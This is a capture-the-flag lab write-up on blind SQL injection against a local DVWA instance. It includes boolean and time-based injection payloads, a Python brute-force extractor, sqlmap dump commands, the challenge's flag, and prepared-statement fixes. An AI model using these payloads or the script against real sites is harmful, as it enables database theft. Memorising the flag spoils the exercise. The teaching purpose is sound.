# Challenge 01 - Blind SQL Injection

**Category:** Web
**Difficulty:** Intermediate
**Points:** 250
**Target:** DVWA (http://localhost:8081)

## Challenge Description

The developers have patched the obvious SQL injection vulnerability, but they made a critical mistake - they only removed the visible output! The vulnerability still exists, but now you can't see the query results directly.

Your mission is to extract the admin password hash from the database using Blind SQL Injection techniques. The flag is hidden in a special table.

## Objectives

- Understand the difference between in-band and blind SQL injection
- Use boolean-based blind SQL injection to extract data
- Implement time-based blind SQL injection as an alternative
- Extract the flag character by character

## Target Information

- **URL:** http://localhost:8081/vulnerabilities/sqli_blind/
- **Credentials:** admin / password
- **Security Level:** Medium
- **Database:** MySQL

## Getting Started

1. Start DVWA:
   ```bash
   cd docker && docker-compose up -d dvwa
   ```

2. Login to DVWA with admin:password
3. Set Security Level to "Medium" (DVWA Security menu)
4. Navigate to SQL Injection (Blind) page

---

## Hints

<details>
<summary>Hint 1 (Cost: -25 points)</summary>

In blind SQL injection, you ask the database yes/no questions. If the answer is "yes", the page responds one way. If "no", it responds differently.

Try:
- `1 AND 1=1` (should return normal response - "yes")
- `1 AND 1=2` (should return different response - "no")

</details>

<details>
<summary>Hint 2 (Cost: -35 points)</summary>

To extract data character by character, use the `SUBSTRING()` function:

```sql
1 AND SUBSTRING((SELECT database()),1,1)='d'
```

This asks: "Is the first character of the database name equal to 'd'?"

You can also use ASCII comparisons:
```sql
1 AND ASCII(SUBSTRING((SELECT database()),1,1))>100
```

</details>

<details>
<summary>Hint 3 (Cost: -50 points)</summary>

The flag is stored in a table called `ctf_secrets` with a column `flag_value`.

To extract it:
```sql
1 AND SUBSTRING((SELECT flag_value FROM ctf_secrets LIMIT 1),1,1)='F'
```

You'll need to iterate through each character position and test each possible character.

For time-based blind (if boolean doesn't work):
```sql
1 AND IF(SUBSTRING((SELECT flag_value FROM ctf_secrets LIMIT 1),1,1)='F',SLEEP(3),0)
```

</details>

---

## Solution Walkthrough

<details>
<summary>Click to reveal full solution</summary>

### Step 1: Confirm Blind SQLi Vulnerability

Test boolean-based injection:

```
# True condition - should show "User ID exists"
1 AND 1=1

# False condition - should show different response
1 AND 1=2
```

If responses differ, blind SQLi is possible.

### Step 2: Enumerate Database Name

Extract database name character by character:

```sql
# Is first char > 'm'? (binary search approach)
1 AND ASCII(SUBSTRING(database(),1,1))>109

# Narrow down to exact character
1 AND SUBSTRING(database(),1,1)='d'
1 AND SUBSTRING(database(),2,1)='v'
1 AND SUBSTRING(database(),3,1)='w'
1 AND SUBSTRING(database(),4,1)='a'
```

Database name: `dvwa`

### Step 3: Find Tables

```sql
# Find tables with 'flag' or 'secret' in name
1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE '%flag%')>0

# Check for ctf_secrets
1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='ctf_secrets')>0
```

### Step 4: Extract Flag Character by Character

Manual extraction (slow but educational):

```sql
# First character
1 AND SUBSTRING((SELECT flag_value FROM ctf_secrets LIMIT 1),1,1)='F'

# Second character
1 AND SUBSTRING((SELECT flag_value FROM ctf_secrets LIMIT 1),2,1)='L'

# Third character
1 AND SUBSTRING((SELECT flag_value FROM ctf_secrets LIMIT 1),3,1)='A'

# Continue for each position...
```

### Step 5: Automation with Python

```python
#!/usr/bin/env python3
"""Blind SQL Injection Flag Extractor"""

import requests
import string

url = "http://localhost:8081/vulnerabilities/sqli_blind/"
cookies = {"PHPSESSID": "YOUR_SESSION_ID", "security": "medium"}

charset = string.ascii_letters + string.digits + "_{}"
flag = ""

for pos in range(1, 50):
    found = False
    for char in charset:
        payload = f"1 AND SUBSTRING((SELECT flag_value FROM ctf_secrets LIMIT 1),{pos},1)='{char}'"

        response = requests.get(
            url,
            params={"id": payload, "Submit": "Submit"},
            cookies=cookies
        )

        if "User ID exists" in response.text:
            flag += char
            print(f"[+] Found: {flag}")
            found = True
            break

    if not found:
        break

print(f"\n[*] FLAG: {flag}")
```

### Step 6: Using sqlmap (Automated)

```bash
# Dump the ctf_secrets table
sqlmap -u "http://localhost:8081/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=xxx; security=medium" \
       --technique=B \
       -D dvwa \
       -T ctf_secrets \
       --dump

# For time-based blind
sqlmap -u "http://localhost:8081/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=xxx; security=medium" \
       --technique=T \
       --time-sec=2 \
       -D dvwa \
       -T ctf_secrets \
       --dump
```

### Result

Flag: `FLAG{bl1nd_sqli_r3qu1r3s_p4t13nc3}`

### Understanding Blind SQL Injection Types

| Type | Detection Method | Speed |
|------|-----------------|-------|
| Boolean-based | Response differs (true/false) | Fast |
| Time-based | Response time differs (SLEEP) | Slow |
| Error-based | Error messages visible | Fast |
| Out-of-band | DNS/HTTP requests | Medium |

### Boolean-Based Logic

```
Original Query: SELECT * FROM users WHERE id='$input'

Injected (True):  SELECT * FROM users WHERE id='1' AND 1=1-- '
Injected (False): SELECT * FROM users WHERE id='1' AND 1=2-- '
```

### Time-Based Logic

```sql
-- MySQL
1 AND IF(condition,SLEEP(5),0)

-- PostgreSQL
1; SELECT CASE WHEN (condition) THEN pg_sleep(5) ELSE pg_sleep(0) END

-- MSSQL
1; IF (condition) WAITFOR DELAY '0:0:5'
```

### Binary Search Optimization

Instead of testing each character:
```sql
-- Start with ASCII midpoint (77 for 'M')
1 AND ASCII(SUBSTRING(data,1,1))>77

-- If true, test upper half (77-122)
-- If false, test lower half (32-77)
-- Repeat until exact character found
```

This reduces checks from ~95 per character to ~7 (log2 of charset size).

### Prevention

```php
// Vulnerable
$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id='$id'";

// Secure - Prepared Statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);

// Also secure - Parameterized queries
$stmt = $mysqli->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
```

</details>

---

## Flag

```
FLAG{bl1nd_sqli_r3qu1r3s_p4t13nc3}
```

**Flag Format:** `FLAG{...}`

## Skills Practiced

- Blind SQL injection techniques
- Boolean-based data extraction
- Time-based blind injection
- Python scripting for automation
- Understanding database query logic

## Tools Used

- Web browser
- Burp Suite (for request manipulation)
- Python + requests library
- sqlmap

## Related Challenges

- [06 - The Classic Injection (Beginner)](../beginner/06-the-classic-injection.md) - Basic SQLi
- [Hash Length Extension (Intermediate)](04-hash-length-extension.md) - Cryptographic attacks

## References

- [OWASP Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)
- [PortSwigger - Blind SQL Injection](https://portswigger.net/web-security/sql-injection/blind)
- [sqlmap Usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
- [PayloadsAllTheThings - Blind SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#blind-sql-injection)
